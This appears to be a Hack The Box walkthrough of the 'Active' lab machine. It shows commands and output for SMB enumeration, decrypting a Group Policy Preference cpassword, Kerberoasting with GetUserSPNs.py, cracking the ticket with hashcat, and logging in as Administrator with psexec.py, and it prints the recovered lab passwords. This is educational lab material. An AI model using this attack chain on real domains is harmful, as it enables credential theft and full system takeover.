---
title: "HTB - Active"
categories: [box]
date: 2022-12-08
comments: true
image: /images/walkthroughs/hackthebox/active/logo.png
favicon: /images/walkthroughs/hackthebox/active/logo.png
description: HTB - Active walkthrough
---

# Active 

<p align="center">
  <img src="/images/walkthroughs/hackthebox/active/banner.png" width="70%"/>
</p>


## Summary

Active is an easy box where we find an open SMB Share with the box group policies. Within it we can find the Group Policy Preference (GPP) with the cpassword (encrypted with a well-know key), so we retrieve the password for the _svc_tgs_ user. With the user we can get into the SMB with access to extra shares, including the Users folder with SVC_TGS desktop and user flag.

For privilege escalation we used GetUserSPNs to check if any account is related with the SVC_TGS and the administrator does. Furthermore, the account is Kerberoastable and we cound cract the ticket and get the Administrator password. WE get into the box and grab the flag.


## Enumeration

- nmap

```
Nmap scan report for 10.129.228.47
Host is up (0.038s latency).
Not shown: 65512 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-12-08 12:35:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
49173/tcp open  msrpc         Microsoft Windows RPC
49174/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-12-08T12:36:54
|_  start_date: 2022-12-08T12:32:21
|_clock-skew: -1s
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
```

We add active.htb to the /etc/hosts


- smbmap

```bash
smbmap -H 10.129.228.47             
[+] IP: 10.129.228.47:445       Name: active.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
```

Checking the Replication share we can see several directories, finding the following Group Policy Preference (GPP):

<p align="center">
  <img src="/images/walkthroughs/hackthebox/active/2_0_replication.png" width="90%"/>
</p>

I'm retrieving the most relevant file from there, group.xml:

- Group XML

```bash
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

Using [gpp-decrypt](https://pentestlab.blog/tag/cpassword/) we can decrypt the password. How? Microsoft released the [key](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN):

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

The password is correct as shown by CME:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/active/3_0_cme.png" width="90%"/>
</p>


**SVC_TGS:GPPstillStandingStrong2k18**

With that password we cannot log into the machine because we have no privileges, but we have extra SMB shares access:


```bash
smbmap -H 10.129.228.48 -u SVC_TGS -p GPPstillStandingStrong2k18
[+] IP: 10.129.228.48:445       Name: 10.129.228.48                                     
  Disk                                                    Permissions     Comment
  ----                                                    -----------     -------
  ADMIN$                                                  NO ACCESS       Remote Admin
  C$                                                      NO ACCESS       Default share
  IPC$                                                    NO ACCESS       Remote IPC
  NETLOGON                                                READ ONLY       Logon server share 
  Replication                                             READ ONLY
  SYSVOL                                                  READ ONLY       Logon server share 
  Users                                                   READ ONLY



smbmap -H 10.129.228.48 -u SVC_TGS -p GPPstillStandingStrong2k18 -R Users

.\Users\SVC_TGS\*
dr--r--r--                0 Sat Jul 21 11:16:32 2018    .
dr--r--r--                0 Sat Jul 21 11:16:32 2018    ..
dr--r--r--                0 Sat Jul 21 11:14:20 2018    Contacts
dr--r--r--                0 Sat Jul 21 11:14:42 2018    Desktop
dr--r--r--                0 Sat Jul 21 11:14:28 2018    Downloads
dr--r--r--                0 Sat Jul 21 11:14:50 2018    Favorites
dr--r--r--                0 Sat Jul 21 11:15:00 2018    Links
dr--r--r--                0 Sat Jul 21 11:15:23 2018    My Documents
dr--r--r--                0 Sat Jul 21 11:15:40 2018    My Music
dr--r--r--                0 Sat Jul 21 11:15:50 2018    My Pictures
dr--r--r--                0 Sat Jul 21 11:16:05 2018    My Videos
dr--r--r--                0 Sat Jul 21 11:16:20 2018    Saved Games
dr--r--r--                0 Sat Jul 21 11:16:32 2018    Searches
.\Users\SVC_TGS\Desktop\*
dr--r--r--                0 Sat Jul 21 11:14:42 2018    .
dr--r--r--                0 Sat Jul 21 11:14:42 2018    ..
fw--w--w--               34 Fri Dec  9 05:01:37 2022    user.txt

smbclient //10.129.228.48/Users -U svc_tgs
```

Access and get the user flag from svc_tgs' desktop:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/active/3_0_user.png" width="90%"/>
</p>


## Privesc

With the name SVC, it might be a service account, let's check with GetUserSPNs.py if it is related to any other account:

```
python3 GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.228.47 -request
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/active/3_1_getuserspn.png" width="90%"/>
</p>

So Administrator is related to the SVC_TGS account and it is kerberoastable, so it retrieved a ticket, now we can use hashcat to crack it, if we can crack it we will get the administrator password:

```bash
19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
 7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
```

In this case we have to use mode 13100 (TGS-REP, etype23). If you don't know just check the hash headers, it will give you a hint of what type of hash is.


```bash
hashcat -m 13100 -a 0 kerb.hash /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$ca00ebc05aaa6bb2c3ebfb977fc15741$6d851b93f163b0432e979cf5a975581d57745dab4045a4e0a363c8313b6c23939be3cd10f771f6c259dfbe4c64be3fe4369d59e2f817f92f8b0d3cc772ee198be2fc80be9e02e4e79fd6f8ac166b093ac5f1a5649292b362bad4354a913fea85e9abdb34763d72b465b9e0e17278dae52b0134b04ddf9aebcd9c865e8622368265c3704d80509701778fb7928eb7b206854f61977c91e580f7db5d566ebf756085b90f0a1e1fd5cb7d9a8485a3ee29fc14467d347e58f466269a9183b096df2dc75a53109cefe1b6de7c0cfe09fd0f4756310e8dd195a4b7509de302ceda01ab62428590e02b5dba357521e8bb7471118b955cf98eb2b88b2ddb7165ac666ab050318f55515ff07a36f97a47efb9fe9f25310f956ec24779278bc2d425f9a10bcf96fed1f9fdded50757d160955ac122e8181acf972169407ba412fa30b70c566b8a44d8cac01e096fd27f954f810610056286037cea89e2c307fb94e753fd05e98eb17ab1b9115b5cf0ff710211e119a6d13bbb4c981ca5d47097aa7817a218a3182f6ce7136f81d3df1fededcf15871b697c24e73b6943415659f70b85f1d8c1caca4834d16b7425e3cab78a3bc2ec8dce9cd2c50789fb7cb49fa1a6c42aa3e31afa238d8a99d4616bf07ca1440d719d4c55341feb209bd4047e7647344cda5f41dc64805004a3cd8fcdbc9a99ede48631a63641a83a5773b42be01dab88cccae810a9f92504781538ecc15cab1a4601ca25830d87d301b1eb4a09040847c28046b42ae75d3d8f2dec320d7ae0bb4832ef654fb02dcc5bb3743d90d85a3a2b1159735d6b8bc7c71bbd812365153a221de685b71c14d1e816f0eafed5cbd23c01e9b814d82bce8921ac82962779f03089b2c3120174a41f1ca29a905e8d658ab25db5c531b24730eaf1c01631919d0350396c0e3754e62da1f09d4e0f4808395bc01c82c3b8392f9833ec6c626eaf1617e9c4765e3a94ac3913e737f3a607cde118bbcd2d3d86a58775b94766d2b508094cf9f12458b8e8168b1b496274fe506abadfaa7a40264c48174a43794f3a321dfaf8c6553f9eaea4e0b2d9f2616f83a01dbb679677f09669165df991ed2be023c01f497a2f015da595d7529e68957869a723174ed76a58a90b2405476946a2866d8f82a90073293d3ca3feb82c8c229bb735c2af87b80649f1b2f11463ade2d2b405f279e82716525e3905a70b007e8a5995e845785dd34770aa8f641402282a497915a06ec910e8a1:Ticketmaster1968

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...10e8a1
Time.Started.....: Thu Dec  8 11:43:38 2022 (9 secs)
Time.Estimated...: Thu Dec  8 11:43:47 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1110.5 kH/s (1.09ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10539008/14344385 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10536960/14344385 (73.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tiffany95 -> Thelittlemermaid
```

So the credentials are:

**Administrator:Ticketmaster1968**

Trying to get into the machine with the credentils using psexec.py

```bash
python3 psexec.py administrator@10.129.228.47
```

Now we are in as Administrator and we can grab the root and user flag now from within the box:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/active/4_0_root.png" width="80%"/>
</p>

<p align="center">
  <img src="/images/walkthroughs/hackthebox/active/4_1_root.png" width="80%"/>
</p>